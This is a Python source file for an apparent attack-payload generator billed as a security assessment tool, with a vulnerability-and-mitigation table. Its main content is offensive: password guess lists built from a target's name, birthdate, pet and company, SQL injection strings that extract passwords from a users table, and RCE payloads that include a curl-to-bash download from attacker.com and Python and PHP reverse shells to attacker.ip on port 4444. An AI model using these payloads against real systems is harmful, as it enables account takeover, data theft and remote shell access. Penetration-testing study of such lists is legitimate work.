import os
import sys
import json
import random
import itertools
import base64
import hashlib
import requests
import re
import uuid
import math
from datetime import datetime
from typing import List, Dict, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from prettytable import PrettyTable

class AdvancedPayloadGenerator:
    def __init__(self):
        """
        Advanced Secure Payload Generation Framework
        Developed by Anubhav Mohandas
        Comprehensive Vulnerability Exploitation Toolkit
        """
        self.payload_types = [
            'password_bruteforce',
            'sql_injection',
            'xss',
            'rce',
            'ldap_injection',
            'command_injection',
            'deserialization',
            'xxe',
            'ssrf',
            'oauth_token_bypass'
        ]
        
        self.payload_storage = {
            type: [] for type in self.payload_types
        }
        
        # Advanced config and dictionaries
        self.config = {
            'max_payload_length': 1024,
            'entropy_threshold': 3.5,
            'mutation_rate': 0.3
        }
        
        # Advanced dictionaries
        self.dictionaries = {
            'common_passwords': [],
            'tech_keywords': [],
            'company_names': [],
            'programming_languages': []
        }
        
        self.load_dictionaries()
        
    def load_dictionaries(self):
        """
        Load comprehensive dictionaries for advanced payload generation
        """
        dictionary_path = os.path.join(os.path.dirname(__file__), 'dictionaries')
        
        dictionary_files = {
            'common_passwords': 'passwords.txt',
            'tech_keywords': 'tech_keywords.txt',
            'company_names': 'companies.txt',
            'programming_languages': 'languages.txt'
        }
        
        for key, filename in dictionary_files.items():
            try:
                with open(os.path.join(dictionary_path, filename), 'r') as f:
                    self.dictionaries[key] = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"Warning: Dictionary {filename} not found. Using minimal built-in list.")
                self.dictionaries[key] = self._generate_minimal_dictionary(key)
    
    def _generate_minimal_dictionary(self, dictionary_type):
        """
        Generate minimal dictionary if file is not found
        """
        minimal_dicts = {
            'common_passwords': [
                'password123', 'admin', 'welcome', 'password', 
                '123456', 'qwerty', 'letmein', 'dragon'
            ],
            'tech_keywords': [
                'database', 'server', 'cloud', 'network', 
                'security', 'authentication', 'encryption'
            ],
            'company_names': [
                'Google', 'Microsoft', 'Amazon', 'Apple', 
                'Facebook', 'Twitter', 'LinkedIn'
            ],
            'programming_languages': [
                'python', 'java', 'javascript', 'c++', 
                'ruby', 'php', 'golang'
            ]
        }
        return minimal_dicts.get(dictionary_type, [])
    
    def generate_advanced_password_payloads(self, personal_info: Dict[str, Any]) -> List[str]:
        """
        Advanced password payload generation with contextual and probabilistic mutations
        """
        base_words = [
            personal_info.get('first_name', ''),
            personal_info.get('last_name', ''),
            personal_info.get('birthdate', ''),
            personal_info.get('pet_name', ''),
            personal_info.get('company', '')
        ]
        
        password_payloads = []
        
        # Probabilistic Mutations
        for word in base_words:
            if not word:
                continue
            
            mutations = [
                word,
                word.lower(),
                word.upper(),
                word.capitalize(),
                word + '!',
                word + '@',
                word + '123',
                word + '!@#',
                '123' + word,
                word + str(random.randint(1900, 2024))
            ]
            
            password_payloads.extend(mutations)
        
        # Advanced Dictionary Enrichment
        password_payloads.extend(self.dictionaries['common_passwords'])
        
        # Contextual Combination
        for word1, word2 in itertools.combinations(base_words, 2):
            if not word1 or not word2:
                continue
            
            combined_words = [
                word1 + word2,
                word2 + word1,
                word1 + '_' + word2,
                word1 + str(random.randint(1, 999))
            ]
            
            password_payloads.extend(combined_words)
        
        # Remove duplicates and apply advanced entropy filter
        unique_payloads = list(set(password_payloads))
        self.payload_storage['password_bruteforce'] = [
            payload for payload in unique_payloads 
            if self._calculate_entropy(payload) >= self.config['entropy_threshold']
        ]
        
        return self.payload_storage['password_bruteforce']
    
    def _calculate_entropy(self, password: str) -> float:
        """
        Calculate password entropy for complexity assessment
        """
        char_set = set(password)
        entropy = len(password) * math.log2(len(char_set))
        return entropy
    
    def generate_advanced_sql_injection(self) -> List[str]:
        """
        Advanced SQL Injection Payload Generation
        """
        base_injections = [
            "' OR '1'='1",
            "1' UNION SELECT NULL, NULL, version()--",
            "admin' --",
            "1 OR 1=1--",
            "'UNION ALL SELECT NULL, NULL, CONCAT(username,0x3a,password) FROM users--"
        ]
        
        # Advanced Blind SQL Injection Techniques
        blind_sql_payloads = [
            "1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--",
            "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 100--",
            "1 OR SUBSTR((SELECT version()),1,1) = '5'--"
        ]
        
        # Time-Based Blind SQL Injection
        time_based_payloads = [
            "1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1) = 'a', SLEEP(5), 0)--",
            "1 OR IF(DATABASE() LIKE '%security%', SLEEP(5), 0)--"
        ]
        
        self.payload_storage['sql_injection'] = list(set(
            base_injections + blind_sql_payloads + time_based_payloads
        ))
        
        return self.payload_storage['sql_injection']
    
    def generate_advanced_rce_payloads(self) -> List[str]:
        """
        Remote Code Execution (RCE) Payload Generation
        """
        rce_payloads = [
            "$(whoami)",
            "`id`",
            "system('ls')",
            "eval('__import__(\\'os\\').system(\\'id\\')')",
            "import os; os.system('whoami')",
            "process.platform",
            "__import__('subprocess').check_output(['ls'])",
            "echo PAYLOAD | base64 -d | bash"
        ]
        
        # Advanced OS Command Injection
        os_specific_payloads = [
            "$(curl http://attacker.com/malware | bash)",
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.ip\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "php -r '$sock=fsockopen(\"attacker.ip\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ]
        
        self.payload_storage['rce'] = list(set(rce_payloads + os_specific_payloads))
        return self.payload_storage['rce']
    
    def perform_payload_analysis(self, payloads: List[str]) -> Dict[str, Any]:
        """
        Perform advanced payload analysis
        """
        analysis_results = {
            'total_payloads': len(payloads),
            'payload_complexity': {},
            'payload_tags': []
        }
        
        for payload in payloads:
            analysis_results['payload_complexity'][payload] = {
                'length': len(payload),
                'entropy': self._calculate_entropy(payload)
            }
        
        return analysis_results
    
    def generate_comprehensive_report(self):
        """
        Generate comprehensive payload generation report
        """
        report = {
            'timestamp': datetime.now().isoformat(),
            'payload_types': {},
            'total_payloads': 0
        }
        
        for payload_type, payloads in self.payload_storage.items():
            report['payload_types'][payload_type] = {
                'count': len(payloads),
                'analysis': self.perform_payload_analysis(payloads)
            }
            report['total_payloads'] += len(payloads)
        
        with open('payload_generation_report.json', 'w') as f:
            json.dump(report, f, indent=4)
        
        return report

def display_vulnerabilities():
    """
    Display vulnerabilities in a formatted table
    """
    table = PrettyTable()
    table.field_names = ["Vulnerability Type", "Description", "Potential Impact", "Mitigation Strategy"]
    table.align["Description"] = "l"
    table.align["Mitigation Strategy"] = "l"
    
    vulnerabilities = [
        ["SQL Injection", "Manipulating SQL queries to access unauthorized data", "High", "Use parameterized queries, input validation"],
        ["Password Bruteforce", "Attempting multiple password combinations", "High", "Implement account lockout, multi-factor authentication"],
        ["Remote Code Execution", "Executing arbitrary system commands", "Critical", "Sanitize inputs, restrict system command execution"],
        ["XSS (Cross-Site Scripting)", "Injecting malicious scripts into web pages", "Medium", "Implement content security policy, encode outputs"],
        ["LDAP Injection", "Manipulating LDAP queries to bypass authentication", "High", "Validate and sanitize user inputs"],
        ["Command Injection", "Executing system commands through application inputs", "Critical", "Use input validation, avoid shell execution"],
        ["Deserialization", "Exploiting unsafe object deserialization", "High", "Use secure serialization libraries, validate data"],
        ["XXE (XML External Entity)", "Exploiting XML parser vulnerabilities", "High", "Disable external entity processing"],
        ["SSRF (Server-Side Request Forgery)", "Forcing server to make unintended network requests", "Medium", "Validate and restrict URL endpoints"],
        ["OAuth Token Bypass", "Exploiting token generation and validation weaknesses", "Medium", "Implement robust token validation"]
    ]
    
    for vuln in vulnerabilities:
        table.add_row(vuln)
    
    return table

def print_colorful_banner():
    """
    Print a colorful banner for the Secure Payload Generator
    """
    banner = """
\033[1;34m╔══════════════════════════════════════════════════╗
\033[1;36m║   🛡️  Secure Gen Payload Generator  🔒         ║
\033[1;34m╟──────────────────────────────────────────────────╢
\033[1;33m║ Advanced Security Vulnerability Assessment Tool  ║
\033[1;32m║ Developed by Anubhav Mohandas                    ║
\033[1;34m╚══════════════════════════════════════════════════╝
\033[0m
"""
    print(banner)

def main():
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Print colorful banner
    print_colorful_banner()
    
    # Create generator instance
    generator = AdvancedPayloadGenerator()
    
    # Example Usage
    personal_info = {
        'first_name': 'John',
        'last_name': 'Doe',
        'birthdate': '19900115',
        'pet_name': 'Max',
        'company': 'TechCorp'
    }
    
    # Generate Payloads
    print("\033[1;35m[*] Generating Password Payloads...\033[0m")
    password_payloads = generator.generate_advanced_password_payloads(personal_info)
    print(f"\033[1;32m[+] Generated {len(password_payloads)} Password Payloads\033[0m")
    
    print("\033[1;35m[*] Generating SQL Injection Payloads...\033[0m")
    sql_payloads = generator.generate_advanced_sql_injection()
    print(f"\033[1;32m[+] Generated {len(sql_payloads)} SQL Injection Payloads\033[0m")
    
    print("\033[1;35m[*] Generating RCE Payloads...\033[0m")
    rce_payloads = generator.generate_advanced_rce_payloads()
    print(f"\033[1;32m[+] Generated {len(rce_payloads)} RCE Payloads\033[0m")
    
    # Display Vulnerabilities
    print("\n\033[1;36m[*] Vulnerability Landscape:\033[0m")
    print(display_vulnerabilities())
    
    # Generate Comprehensive Report
    print("\n\033[1;35m[*] Generating Comprehensive Report...\033[0m")
    report = generator.generate_comprehensive_report()
    print(f"\033[1;32m[+] Report Generated: payload_generation_report.json\033[0m")

if __name__ == "__main__":
    try:
        # Requires PrettyTable for tabular display
        main()
    except ImportError:
        print("Please install required libraries: pip install prettytable")
        sys.exit(1)